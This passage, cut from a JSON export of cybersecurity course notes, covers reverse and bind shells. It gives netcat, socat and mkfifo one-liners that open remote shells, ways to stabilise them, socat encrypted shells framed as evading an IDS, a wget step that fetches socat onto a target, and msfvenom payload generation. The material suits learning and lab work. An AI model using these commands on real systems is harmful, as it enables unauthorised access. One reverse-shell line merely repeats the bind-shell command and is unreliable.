shells","position":{"start":{"line":32,"column":5,"offset":1378},"end":{"line":32,"column":40,"offset":1413},"indent":[]},"xvault":false,"sameFile":true,"to":{"fname":"shells","anchorHeader":"bind-shell-example"}},{"type":"wiki","from":{"fname":"shells","id":"ixopv5geql8hlgkwk20pxow","vaultName":"vault"},"value":"metasploit.meterpreter","alias":"Meterpreter shells are Metasploit's own brand of fully-featured shell","position":{"start":{"line":219,"column":1,"offset":12817},"end":{"line":219,"column":97,"offset":12913},"indent":[]},"xvault":false,"sameFile":false,"to":{"fname":"metasploit.meterpreter"}},{"type":"wiki","from":{"fname":"shells","id":"ixopv5geql8hlgkwk20pxow","vaultName":"vault"},"value":"metasploit","alias":"Metasploit","position":{"start":{"line":246,"column":5,"offset":14146},"end":{"line":246,"column":30,"offset":14171},"indent":[]},"xvault":false,"sameFile":false,"to":{"fname":"metasploit"}}],"anchors":{"what-is-a-shell":{"type":"header","text":"What is a Shell?","value":"what-is-a-shell","line":8,"column":0,"depth":1},"tools":{"type":"header","text":"Tools","value":"tools","line":17,"column":0,"depth":2},"netcat":{"type":"header","text":"Netcat","value":"netcat","line":21,"column":0,"depth":3},"netcat-shell-stabilization":{"type":"header","text":"Netcat Shell Stabilization","value":"netcat-shell-stabilization","line":42,"column":0,"depth":4},"python":{"type":"header","text":"Python","value":"python","line":46,"column":0,"depth":5},"rlwrap":{"type":"header","text":"rlwrap","value":"rlwrap","line":58,"column":0,"depth":5},"socat-stable":{"type":"header","text":"Socat Stable","value":"socat-stable","line":67,"column":0,"depth":5},"change-terminal-tty-size":{"type":"header","text":"Change Terminal tty Size","value":"change-terminal-tty-size","line":74,"column":0,"depth":5},"socat":{"type":"header","text":"Socat","value":"socat","line":82,"column":0,"depth":3},"socat-reverse-shells":{"type":"header","text":"Socat Reverse Shells","value":"socat-reverse-shells","line":92,"column":0,"depth":4},"socat-bind-shells":{"type":"header","text":"Socat Bind Shells","value":"socat-bind-shells","line":102,"column":0,"depth":4},"socat-encrypted-shells":{"type":"header","text":"Socat Encrypted Shells","value":"socat-encrypted-shells","line":119,"column":0,"depth":4},"metasploit----multihandler":{"type":"header","text":"Metasploit -- multi/handler","value":"metasploit----multihandler","line":133,"column":0,"depth":3},"msfvenom":{"type":"header","text":"Msfvenom","value":"msfvenom","line":139,"column":0,"depth":3},"types-of-shell":{"type":"header","text":"Types of Shell","value":"types-of-shell","line":147,"column":0,"depth":2},"reverse-shells":{"type":"header","text":"Reverse Shells","value":"reverse-shells","line":149,"column":0,"depth":3},"reverse-shell-example":{"type":"header","text":"Reverse Shell Example","value":"reverse-shell-example","line":156,"column":0,"depth":4},"bind-shells":{"type":"header","text":"Bind Shells","value":"bind-shells","line":166,"column":0,"depth":3},"bind-shell-example":{"type":"header","text":"Bind Shell Example","value":"bind-shell-example","line":173,"column":0,"depth":4},"interactive":{"type":"header","text":"Interactive","value":"interactive","line":183,"column":0,"depth":3},"non-interactive":{"type":"header","text":"Non-Interactive","value":"non-interactive","line":187,"column":0,"depth":3},"common-shell-payloads":{"type":"header","text":"Common Shell Payloads","value":"common-shell-payloads","line":191,"column":0,"depth":2},"msfvenom-1":{"type":"header","text":"msfvenom","value":"msfvenom-1","line":199,"column":0,"depth":2},"staged-payloads":{"type":"header","text":"Staged Payloads","value":"staged-payloads","line":211,"column":0,"depth":3},"stageless-payloads":{"type":"header","text":"Stageless Payloads","value":"stageless-payloads","line":219,"column":0,"depth":3},"meterpreter":{"type":"header","text":"Meterpreter","value":"meterpreter","line":223,"column":0,"depth":3},"payload-naming-conventions":{"type":"header","text":"Payload Naming Conventions","value":"payload-naming-conventions","line":231,"column":0,"depth":3},"metasploit-multihandler":{"type":"header","text":"Metasploit multi/handler","value":"metasploit-multihandler","line":252,"column":0,"depth":3},"web-shells":{"type":"header","text":"Web Shells","value":"web-shells","line":270,"column":0,"depth":2}},"children":[],"parent":"3ipqfkgudo2s73dwa256ca0","data":{}},"body":"\u003ch1 id=\"shells\"\u003e\u003ca aria-hidden=\"true\" class=\"anchor-heading icon-link\" href=\"#shells\"\u003e\u003c/a\u003eShells\u003c/h1\u003e\n\u003ch1 id=\"what-is-a-shell\"\u003e\u003ca aria-hidden=\"true\" class=\"anchor-heading icon-link\" href=\"#what-is-a-shell\"\u003e\u003c/a\u003eWhat is a Shell?\u003c/h1\u003e\n\u003cp\u003eShells are what we use when interfacing with a Command Line environment (CLI).\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003ebash or sh for Linux\u003c/li\u003e\n\u003cli\u003ecmd.exe and Powershell on Windows\u003c/li\u003e\n\u003c/ul\u003e\n\u003cp\u003eWe can force the remote server to either send us command line access to the server (a \u003cstrong\u003ereverse\u003c/strong\u003e shell), or to open a port on the server to connect and execute further commands (a \u003cstrong\u003ebind\u003c/strong\u003e shell.)\u003c/p\u003e\n\u003ch2 id=\"tools\"\u003e\u003ca aria-hidden=\"true\" class=\"anchor-heading icon-link\" href=\"#tools\"\u003e\u003c/a\u003eTools\u003c/h2\u003e\n\u003cp\u003eThere are a variety of tools to receive reverse shells and to send bind shells.\u003c/p\u003e\n\u003ch3 id=\"netcat\"\u003e\u003ca aria-hidden=\"true\" class=\"anchor-heading icon-link\" href=\"#netcat\"\u003e\u003c/a\u003eNetcat\u003c/h3\u003e\n\u003cp\u003eNetcat is the traditional \"Swiss Army Knife\" of networking.\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003eUsed to perform all kinds of network interactions including things like banner grabbing during enumeration, and used to receive reverse shells and connect to remote ports attached to bind shells on a target.\u003c/li\u003e\n\u003c/ul\u003e\n\u003cp\u003e\u003ca href=\"/IBM-cybersecurity/notes/ixopv5geql8hlgkwk20pxow#reverse-shell-example\"\u003eReverse shells require shellcode and a listener. The syntax for starting a netcat listener using Linux:\u003c/a\u003e \u003ccode\u003enc -lvnp \u0026#x3C;PORT\u003e\u003c/code\u003e\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003e\u003ccode\u003e-l\u003c/code\u003e to tell netcat that this will be a listener\u003c/li\u003e\n\u003cli\u003e\u003ccode\u003e-v\u003c/code\u003e to request a verbose output\u003c/li\u003e\n\u003cli\u003e\u003ccode\u003e-n\u003c/code\u003e tells netcat not to resolve host names or use DNS\u003c/li\u003e\n\u003cli\u003e\u003ccode\u003e-p\u003c/code\u003e indicates the port specification will follow\u003c/li\u003e\n\u003c/ul\u003e\n\u003cp\u003eAny port could be used as long there is not a service already using it. If you choose to use a port below 1024, you will need \u003ccode\u003esudo\u003c/code\u003e to start the listener.\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003eA good idea to use well-known port numbers (80, 443 or 53) as this is more likely to get past outbound firewall rules on the target.\u003c/li\u003e\n\u003c/ul\u003e\n\u003cp\u003eFor \u003ca href=\"/IBM-cybersecurity/notes/ixopv5geql8hlgkwk20pxow#bind-shell-example\"\u003ebind shells\u003c/a\u003e, we assume there is already a listener waiting for us on a chosen port of the target. All we have to do is connect with the syntax: \u003ccode\u003enc \u0026#x3C;TARGET-IP\u003e \u0026#x3C;CHOSEN-PORT\u003e\u003c/code\u003e.\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003eWe use netcat to make an outbound connection to the target on our chosen port.\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch4 id=\"netcat-shell-stabilization\"\u003e\u003ca aria-hidden=\"true\" class=\"anchor-heading icon-link\" href=\"#netcat-shell-stabilization\"\u003e\u003c/a\u003eNetcat Shell Stabilization\u003c/h4\u003e\n\u003cp\u003eThese shells are very unstable by default. Pressing CTRL+C kills the whole session and are non-interactive. There are ways to stabilize netcat shells on Linux systems. Meanwhile, Windows reverse shells tend to be significantly difficult.\u003c/p\u003e\n\u003ch5 id=\"python\"\u003e\u003ca aria-hidden=\"true\" class=\"anchor-heading icon-link\" href=\"#python\"\u003e\u003c/a\u003ePython\u003c/h5\u003e\n\u003cp\u003eAlmost every Linux distribution will have Python installed by default.\u003c/p\u003e\n\u003col\u003e\n\u003cli\u003e\u003ccode\u003epython -c 'import pty;pty.spawn(\"/bin/bash\")'\u003c/code\u003e uses Python to spawn a better featured bash shell. Note that some targets may need the version of Python specified such as \u003ccode\u003epython2\u003c/code\u003e or \u003ccode\u003epython3\u003c/code\u003e as required.\u003c/li\u003e\n\u003cli\u003e\u003ccode\u003eexport TERM=xterm\u003c/code\u003e will give us access to term commands such as \u003ccode\u003eclear\u003c/code\u003e.\u003c/li\u003e\n\u003cli\u003eFinally background the shell using CTRL+Z. Back in our own terminal, we can use \u003ccode\u003estty raw -echo; fg\u003c/code\u003e to allow us to turn off our own terminal echo (gives access to tab completions, the arrow keys, and CTRL+C to kill processes). It then foregrounds the shell and completing the process.\u003c/li\u003e\n\u003c/ol\u003e\n\u003cp\u003e\u003cimg src=\"https://i.imgur.com/bQnFz1T.png\" alt=\"python\"\u003e\u003c/p\u003e\n\u003cp\u003eIf the shell dies, any input in your own terminal will not be visible (result of having disabled terminal echo). Type \u003ccode\u003ereset\u003c/code\u003e and enter to fix this.\u003c/p\u003e\n\u003ch5 id=\"rlwrap\"\u003e\u003ca aria-hidden=\"true\" class=\"anchor-heading icon-link\" href=\"#rlwrap\"\u003e\u003c/a\u003erlwrap\u003c/h5\u003e\n\u003cp\u003erlwrap is a program gives us access to history, tab autocompletion and the arrow keys immediately upon receiving a shell. However, some manual stabilization must still be utilized to use CTRL+C inside the shell. rlwrap is not installed by default on Kali and can be installed with: \u003ccode\u003esudo apt install rlwrap\u003c/code\u003e.\u003c/p\u003e\n\u003cp\u003eTo use rlwrap listener: \u003ccode\u003erlwrap nc -lvnp \u0026#x3C;PORT\u003e\u003c/code\u003e\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003e'rlwrap' provides a much more fully featured shell. This technique is useful with Windows shells which are difficult to stabilize.\n\u003cul\u003e\n\u003cli\u003eWith Linux target, it is possible to completely stabilize with the same trick before: background the shell with CTRL+Z, then use \u003ccode\u003estty raw -echo; fg\u003c/code\u003e to stabilize and re-enter the shell.\u003c/li\u003e\n\u003c/ul\u003e\n\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch5 id=\"socat-stable\"\u003e\u003ca aria-hidden=\"true\" class=\"anchor-heading icon-link\" href=\"#socat-stable\"\u003e\u003c/a\u003eSocat Stable\u003c/h5\u003e\n\u003cp\u003eThe third easy way to stabilize a shell is initialize a netcat shell as a stepping stone to a full featured socat shell. This technique is limited to Linux targets, as Socat shells on Windows will be no more stable than a netcat shell.\u003c/p\u003e\n\u003col\u003e\n\u003cli\u003eFirst transfer a socat static compiled binary (a version of the program compiled to have no dependencies) to the target machine. A common way to achieve this would be use web server on the attacking machine inside the directory containing socat binary (\u003ccode\u003esudo python3 -m http.server 80\u003c/code\u003e).\u003c/li\u003e\n\u003cli\u003eOn the target machine, use the netcat shell to download the file with \u003ccode\u003ewget \u0026#x3C;LOCAL-IP\u003e/socat -O /tmp/socat\u003c/code\u003e for Linux. On Windows machine CLI environment with Powershell: \u003ccode\u003eInvoke-WebRequest -uri \u0026#x3C;LOCAL-IP\u003e/socat.exe -outfile C:\\\\Windows\\temp\\socat.exe\u003c/code\u003e.\u003c/li\u003e\n\u003c/ol\u003e\n\u003ch5 id=\"change-terminal-tty-size\"\u003e\u003ca aria-hidden=\"true\" class=\"anchor-heading icon-link\" href=\"#change-terminal-tty-size\"\u003e\u003c/a\u003eChange Terminal tty Size\u003c/h5\u003e\n\u003cp\u003eMust be done manually in a reverse or bind shell if you want to use something like a text editor which overwrites everything on the screen.\u003c/p\u003e\n\u003col\u003e\n\u003cli\u003eOpen another terminal and run \u003ccode\u003estty -a\u003c/code\u003e. This will give a large stream of output.\u003c/li\u003e\n\u003cli\u003eIn the reverse/bind shell, type \u003ccode\u003estty rows \u0026#x3C;number\u003e\u003c/code\u003e and \u003ccode\u003estty cols \u0026#x3C;number\u003e\u003c/code\u003e.\u003c/li\u003e\n\u003cli\u003eInput the numbers returned from running the command in own terminal. This will change the width and height of the terminal to allow programs such as text editors do display information to be accurate and correctly open.\u003c/li\u003e\n\u003c/ol\u003e\n\u003ch3 id=\"socat\"\u003e\u003ca aria-hidden=\"true\" class=\"anchor-heading icon-link\" href=\"#socat\"\u003e\u003c/a\u003eSocat\u003c/h3\u003e\n\u003cp\u003eLike netcat on steroids. It can do all of the same things, and many more. Socat shells are usually more stable than netcat shells out of the box. However, the two big catches are:\u003c/p\u003e\n\u003col\u003e\n\u003cli\u003eThe syntax is more difficult\u003c/li\u003e\n\u003cli\u003eNetcat is installed on virtually every Linux distribution by default. Socat is rarely installed by default.\u003c/li\u003e\n\u003c/ol\u003e\n\u003cp\u003eBoth Socat and Netcat have .exe versions for use on Windows.\u003c/p\u003e\n\u003ch4 id=\"socat-reverse-shells\"\u003e\u003ca aria-hidden=\"true\" class=\"anchor-heading icon-link\" href=\"#socat-reverse-shells\"\u003e\u003c/a\u003eSocat Reverse Shells\u003c/h4\u003e\n\u003cp\u003eSocat is a connector between two points similar to the portal gun from the Portal games.\u003c/p\u003e\n\u003cp\u003eThe syntax for a basic reverse shell listener in socat: \u003ccode\u003esocat TCP-L:\u0026#x3C;PORT\u003e -\u003c/code\u003e. This will work on either Linux or Windows and is equivalent to \u003ccode\u003enc -lvnp \u0026#x3C;PORT\u003e\u003c/code\u003e.\u003c/p\u003e\n\u003cp\u003eOn Windows use to connect back: \u003ccode\u003esocat TCP:\u0026#x3C;LOCAL-IP\u003e:\u0026#x3C;LOCAL-PORT\u003e EXEC:powershell.exe,pipes\u003c/code\u003e. The pipes option is used to force powershell or cmd.exe to use Unix style standard input and output.\u003c/p\u003e\n\u003cp\u003eThe equivalent for Linux target: \u003ccode\u003esocat TCP:\u0026#x3C;LOCAL-IP\u003e:\u0026#x3C;LOCAL-PORT\u003e EXEC:\"bash -li\"\u003c/code\u003e.\u003c/p\u003e\n\u003ch4 id=\"socat-bind-shells\"\u003e\u003ca aria-hidden=\"true\" class=\"anchor-heading icon-link\" href=\"#socat-bind-shells\"\u003e\u003c/a\u003eSocat Bind Shells\u003c/h4\u003e\n\u003cp\u003eOn a Linux target: \u003ccode\u003esocat TCP-L:\u0026#x3C;PORT\u003e EXEC:\"bash -li\"\u003c/code\u003e.\u003c/p\u003e\n\u003cp\u003eOn a Windows target: \u003ccode\u003esocat TCP-L:\u0026#x3C;PORT\u003e EXEC:powershell.exe,pipes\u003c/code\u003e.\u003c/p\u003e\n\u003cp\u003eRegardless of the target, we use \u003ccode\u003esocat TCP:\u0026#x3C;TARGET-IP\u003e:\u0026#x3C;TARGET-PORT\u003e -\u003c/code\u003e on the attacking machine to connect to the waiting listener.\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003eFor a fully stable Linux tty reverse shell: \u003ccode\u003esocat TCP-L:\u0026#x3C;PORT\u003e FILE:'tty',raw,echo=0\u003c/code\u003e\u003c/li\u003e\n\u003cli\u003eTo connect to the listener: \u003ccode\u003esocat TCP:\u0026#x3C;attacker-ip\u003e:\u0026#x3C;attacker-port\u003e EXEC:\"bash -li\",pty,stderr,sigint,setsid,sane\u003c/code\u003e.\n\u003cul\u003e\n\u003cli\u003e\u003ccode\u003eEXEC:\"bash -li\"\u003c/code\u003e creates an interactive bash session with the arguments: pty, stderr, sigint, setsid, and sane.\n\u003cul\u003e\n\u003cli\u003e\u003ccode\u003epty\u003c/code\u003e allocates a pseudo-terminal on the target - part of the stabilization process.\u003c/li\u003e\n\u003cli\u003e\u003ccode\u003estderr\u003c/code\u003e makes sure that any error messages get shown in the shell (often a problem in non-interactive shells).\u003c/li\u003e\n\u003cli\u003e\u003ccode\u003esigint\u003c/code\u003e passes any CTRL+C commands through into the sub-process, allowing us to kill commands inside the shell.\u003c/li\u003e\n\u003cli\u003e\u003ccode\u003esetsid\u003c/code\u003e creates the process in a new session.\u003c/li\u003e\n\u003cli\u003e\u003ccode\u003esane\u003c/code\u003e stabilizes the terminal, attempting to 'normalize' it.\u003c/li\u003e\n\u003c/ul\u003e\n\u003c/li\u003e\n\u003c/ul\u003e\n\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch4 id=\"socat-encrypted-shells\"\u003e\u003ca aria-hidden=\"true\" class=\"anchor-heading icon-link\" href=\"#socat-encrypted-shells\"\u003e\u003c/a\u003eSocat Encrypted Shells\u003c/h4\u003e\n\u003cp\u003eSocat is capable of creating encrypted shells - both bind and reverse. Encrypted shells cannot be spied on unless you have the decryption key and are often able to bypass an IDS as a result.\u003c/p\u003e\n\u003col\u003e\n\u003cli\u003eGenerate a certificate in order to use encrypted shells on our attacking machine: \u003ccode\u003eopenssl req --newkey rsa:2048 -nodes -keyout shell.key -x509 -days 362 -out shell.crt\u003c/code\u003e. This command creates a 2048 bit RSA key with a matching cert file, self-signed, and valid for just under a year. It will ask to fill information about the certificate and can be let blank, or filled randomly.\u003c/li\u003e\n\u003cli\u003eNow need to merge the two files into a single \u003ccode\u003e.pem\u003c/code\u003e file: \u003ccode\u003ecat shell.key shell.crt \u003e shell.pem\u003c/code\u003e.\u003c/li\u003e\n\u003cli\u003eSet up our reverse shell listener with \u003ccode\u003esocat OPENSSL-LISTEN:\u0026#x3C;PORT\u003e,cert=shell.pem,verify=0\u003c/code\u003e. This opens up an OPENSSL listener using the generated certificate and \u003ccode\u003everify=0\u003c/code\u003e tells the connection to not bother trying to validate our certificate has been properly signed by a recognized authority.\n\u003cul\u003e\n\u003cli\u003eThe certificate must be used on whichever device is listening.\u003c/li\u003e\n\u003c/ul\u003e\n\u003c/li\u003e\n\u003cli\u003eConnect back with \u003ccode\u003esocat OPENSSL:\u0026#x3C;LOCAL-IP\u003e:\u0026#x3C;LOCAL-PORT\u003e,verify=0 EXEC:/bin/bash\u003c/code\u003e.\u003c/li\u003e\n\u003c/ol\u003e\n\u003cp\u003eThe same technique would apply for a bind shell.\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003eTarget: \u003ccode\u003esocat OPENSSL-LISTEN:\u0026#x3C;PORT\u003e,cert=shell.pem,verify=0 EXEC:cmd.exe,pipes\u003c/code\u003e\u003c/li\u003e\n\u003cli\u003eAttacker: \u003ccode\u003esocat OPENSSL:\u0026#x3C;TARGET-IP\u003e:\u0026#x3C;TARGET-PORT\u003e,verify=0\u003c/code\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch3 id=\"metasploit----multihandler\"\u003e\u003ca aria-hidden=\"true\" class=\"anchor-heading icon-link\" href=\"#metasploit----multihandler\"\u003e\u003c/a\u003eMetasploit -- multi/handler\u003c/h3\u003e\n\u003cp\u003eThe \u003ccode\u003eauxiliary/multi/handler\u003c/code\u003e module of the Metasploit framework is, like socat and netcat, used to receive reverse shells.\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003eThe only way to interact with a meterpreter shell and easiest way to handle staged payloads.\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch3 id=\"msfvenom\"\u003e\u003ca aria-hidden=\"true\" class=\"anchor-heading icon-link\" href=\"#msfvenom\"\u003e\u003c/a\u003eMsfvenom\u003c/h3\u003e\n\u003cp\u003eLike multi/handler, msfvenom is technically part of the Metasploit Framework.\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003eShipped as a standalone tool\u003c/li\u003e\n\u003cli\u003eUsed to generate payloads on the fly\u003c/li\u003e\n\u003cli\u003eMsfvenom can generate payloads other than reverse and bind shells\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch2 id=\"types-of-shell\"\u003e\u003ca aria-hidden=\"true\" class=\"anchor-heading icon-link\" href=\"#types-of-shell\"\u003e\u003c/a\u003eTypes of Shell\u003c/h2\u003e\n\u003ch3 id=\"reverse-shells\"\u003e\u003ca aria-hidden=\"true\" class=\"anchor-heading icon-link\" href=\"#reverse-shells\"\u003e\u003c/a\u003eReverse Shells\u003c/h3\u003e\n\u003cp\u003eWhen the target is forced to execute code that connects back to your computer (need a listener back to attacker computer).\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003eReverse shells are good way to bypass firewall rules that may prevent from connecting to arbitrary ports on the target.\n\u003cul\u003e\n\u003cli\u003eDrawback is to configure own network to accept the shell over the internet.\u003c/li\u003e\n\u003c/ul\u003e\n\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch4 id=\"reverse-shell-example\"\u003e\u003ca aria-hidden=\"true\" class=\"anchor-heading icon-link\" href=\"#reverse-shell-example\"\u003e\u003c/a\u003eReverse Shell Example\u003c/h4\u003e\n\u003cp\u003eA reverse shell listener to receive the connection. A simulation of sending a reverse shell.\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"https://i.imgur.com/rN7YkJJ.png\" alt=\"reverse shell\"\u003e\u003c/p\u003e\n\u003cp\u003eOn the attacking machine: \u003ccode\u003esudo nc -lvnp 443\u003c/code\u003e\u003c/p\u003e\n\u003cp\u003eOn the the target: \u003ccode\u003enc \u0026#x3C;LOCAL-IP\u003e \u0026#x3C;PORT\u003e -e /bin/bash\u003c/code\u003e\u003c/p\u003e\n\u003ch3 id=\"bind-shells\"\u003e\u003ca aria-hidden=\"true\" class=\"anchor-heading icon-link\" href=\"#bind-shells\"\u003e\u003c/a\u003eBind Shells\u003c/h3\u003e\n\u003cp\u003eWhen the code executed on the target is used to start a listener attached to a shell directly on the target.\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003eOpen to the internet allowing to connect to the port that the code has opened and obtain remote code execution.\n\u003cul\u003e\n\u003cli\u003eAdvantage of not requiring any configuration on own network, but may be prevented by firewalls protecting the target.\u003c/li\u003e\n\u003c/ul\u003e\n\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch4 id=\"bind-shell-example\"\u003e\u003ca aria-hidden=\"true\" class=\"anchor-heading icon-link\" href=\"#bind-shell-example\"\u003e\u003c/a\u003eBind Shell Example\u003c/h4\u003e\n\u003cp\u003eListener on the target and telling it to execute \u003ccode\u003ecmd.exe\u003c/code\u003e.\u003c/p\u003e\n\u003cp\u003eOn the target: \u003ccode\u003enc -lvnp \u0026#x3C;PORT\u003e -e \"cmd.exe\"\u003c/code\u003e\u003c/p\u003e\n\u003cp\u003eOn the attacking machine: \u003ccode\u003enc MACHINE_IP \u0026#x3C;PORT\u003e\u003c/code\u003e\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"https://i.imgur.com/6GUwZsw.png\" alt=\"bind shell\"\u003e\u003c/p\u003e\n\u003ch3 id=\"interactive\"\u003e\u003ca aria-hidden=\"true\" class=\"anchor-heading icon-link\" href=\"#interactive\"\u003e\u003c/a\u003eInteractive\u003c/h3\u003e\n\u003cp\u003eIf used Powershell, Bash, Zsh, sh or any other standard CLI environment to allow interaction with programs after executing them.\u003c/p\u003e\n\u003ch3 id=\"non-interactive\"\u003e\u003ca aria-hidden=\"true\" class=\"anchor-heading icon-link\" href=\"#non-interactive\"\u003e\u003c/a\u003eNon-Interactive\u003c/h3\u003e\n\u003cp\u003eLimited to using programs which do not require user interaction in order to run properly. The majority of simple reverse and bind shells are non-interactive.\u003c/p\u003e\n\u003ch2 id=\"common-shell-payloads\"\u003e\u003ca aria-hidden=\"true\" class=\"anchor-heading icon-link\" href=\"#common-shell-payloads\"\u003e\u003c/a\u003eCommon Shell Payloads\u003c/h2\u003e\n\u003cp\u003eOn Linux, we use this code to create a listener for a bind shell: \u003ccode\u003emkfifo /tmp/f; nc -lvnp \u0026#x3C;PORT\u003e \u0026#x3C; /tmp/f | /bin/sh \u003e/tmp/f 2\u003e\u0026#x26;1; rm /tmp/f\u003c/code\u003e.\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003eThe command first creates a named pipe at \u003ccode\u003e/tmp/f\u003c/code\u003e. It then starts a netcat listener, and connects the input of the listener to the output of the named pipe.\u003c/li\u003e\n\u003cli\u003eA very similar command can be used to send a netcat reverse shell: \u003ccode\u003emkfifo /tmp/f; nc -lvnp \u0026#x3C;PORT\u003e \u0026#x3C; /tmp/f | /bin/sh \u003e/tmp/f 2\u003e\u0026#x26;1; rm /tmp/f\u003c/code\u003e\u003c/li\u003e\n\u003cli\u003eFor other common reverse shell payloads, \u003ca href=\"https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md\"\u003ePayloadsAllTheThings\u003c/a\u003e is a repository containing a wide range of shell codes (usually in one-liner format for copying and pasting), in many different languages.\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch2 id=\"msfvenom-1\"\u003e\u003ca aria-hidden=\"true\" class=\"anchor-heading icon-link\" href=\"#msfvenom-1\"\u003e\u003c/a\u003emsfvenom\u003c/h2\u003e\n\u003cp\u003eMsfvenom: The one-stop-shop for all things payload related. Part of the Metasploit framework, msfvenom is used to generate code for primarily reverse and bind shells.\u003c/p\u003e\n\u003cp\u003eThe standard syntax for msfvenom: \u003ccode\u003emsfvenom -p \u0026#x3C;PAYLOAD\u003e \u0026#x3C;OPTIONS\u003e\u003c/code\u003e.\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003eTo generate a Windows x64 Reverse Shell in an exe format: \u003ccode\u003emsfvenom -p windows/x64/shell/reverse_tcp -f exe -o shell.exe LHOST=\u0026#x3C;listen-IP\u003e LPORT=\u0026#x3C;listen-port\u003e\u003c/code\u003e.\n\u003cul\u003e\n\u003cli\u003e\u003ccode\u003e-f\u003c/code\u003e specifies the output format.\u003c/li\u003e\n\u003cli\u003e\u003ccode\u003e-o\u003c/code\u003e the output location and filename for the generated payload.\u003c/li\u003e\n\u003cli\u003e\u003ccode\u003eLHOST=\u0026#x3C;IP\u003e\u003c/code\u003e specifies the IP to connect back to.\u003c/li\u003e\n\u003cli\u003e\u003ccode\u003eLPORT=\u0026#x3C;PORT\u003e\u003c/code\u003e the port on the local machine to connect back to. This can be anything between 0-65535 that isn't already in use. However, the ports below 1024 are restricted and require a listener running with root privileges.\u003c/li\u003e\n\u003c/ul\u003e\n\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch3 id=\"staged-payloads\"\u003e\u003ca aria-hidden=\"true\" class=\"anchor-heading icon-link\" href=\"#staged-payloads\"\u003e\u003c/a\u003eStaged Payloads\u003c/h3\u003e\n\u003cp\u003eStaged payloads are sent in two parts.\u003c/p\u003e\n\u003col\u003e\n\u003cli\u003eStager - A piece of code which is executed directly on the server itself. It connects back to a waiting listener, but doesn't actually contain any reverse shell code by itself. Instead, it connects to the listener and uses the connection to load the real payload, executing it directly and preventing it from touching the disk where it could be caught by traditional anti-virus solutions.\u003c/li\u003e\n\u003c/ol\u003e\n\u003cul\u003e\n\u003cli\u003eThe payloads are split into two parts - a small initial stager, then the bulkier reverse shell code which is downloaded when the stager is activated. Staged payloads require a special listener - usually the Metasploit multi/handler.\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch3 id=\"stageless-payloads\"\u003e\u003ca aria-hidden=\"true\" class=\"anchor-heading icon-link\" href=\"#stageless-payloads\"\u003e\u003c/a\u003eStageless Payloads\u003c/h3\u003e\n\u003cp\u003eStageless payloads are more common where they are entirely self-contained. There is one piece of code which, when executed, sends a shell back immediately to the waiting listener.\u003c/p\u003e\n\u003ch3 id=\"meterpreter\"\u003e\u003ca aria-hidden=\"true\" class=\"anchor-heading icon-link\" href=\"#meterpreter\"\u003e\u003c/a\u003eMeterpreter\u003c/h3\u003e\n\u003cp\u003e\u003ca href=\"/IBM-cybersecurity/notes/5jlm4r7fxj9qpp2xtelvktu\"\u003eMeterpreter shells are Metasploit's own brand of fully-featured shell\u003c/a\u003e. They are completely stable, making them very good when working with Windows targets.\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003eBuilt-in functionality such as file uploads and downloads.\u003c/li\u003e\n\u003cli\u003eDownside is meterpreter shells must be caught in Metasploit.\u003c/li\u003e\n\u003cli\u003eAlso banned from certain certification examinations.\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch3 id=\"payload-naming-conventions\"\u003e\u003ca aria-hidden=\"true\" class=\"anchor-heading icon-link\" href=\"#payload-naming-conventions\"\u003e\u003c/a\u003ePayload Naming Conventions\u003c/h3\u003e\n\u003cp\u003eWhen working with msfvenom, the basic convention is \u003ccode\u003e\u0026#x3C;OS\u003e/\u0026#x3C;arch\u003e/\u0026#x3C;payload\u003e\u003c/code\u003e.\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003eExample: \u003ccode\u003elinux/x86/shell_reverse_tcp\u003c/code\u003e\n\u003cul\u003e\n\u003cli\u003eThis would generate a stageless reverse shell for an x86 Linux target.\u003c/li\u003e\n\u003c/ul\u003e\n\u003c/li\u003e\n\u003c/ul\u003e\n\u003cp\u003eThe exception to this convention is Windows 32 bit targets. The arch is not specified: \u003ccode\u003ewindows/shell_reverse_tcp\u003c/code\u003e\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003eFor a 64 bit Windows target, the arch would be specified as normal (x64).\u003c/li\u003e\n\u003c/ul\u003e\n\u003cp\u003eStageless payloads are denoted with underscores (\u003ccode\u003e_\u003c/code\u003e). The staged equivalent would be \u003ccode\u003eshell/reverse_tcp\u003c/code\u003e\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003eStaged payloads are denoted with another forward slash (\u003ccode\u003e/\u003c/code\u003e).\n\u003cul\u003e\n\u003cli\u003eA Windows 64 bit staged Meterpreter payload: \u003ccode\u003ewindows/x64/meterpreter/reverse_tcp\u003c/code\u003e\u003c/li\u003e\n\u003cli\u003eA Linux 32 bit stageless Meterpreter payload: \u003ccode\u003elinux/x86/meterpreter_reverse_tcp\u003c/code\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\u003c/li\u003e\n\u003c/ul\u003e\n\u003cp\u003e\u003ccode\u003emsfvenom --list payloads\u003c/code\u003e can be used to list all available payloads, which can then be piped into 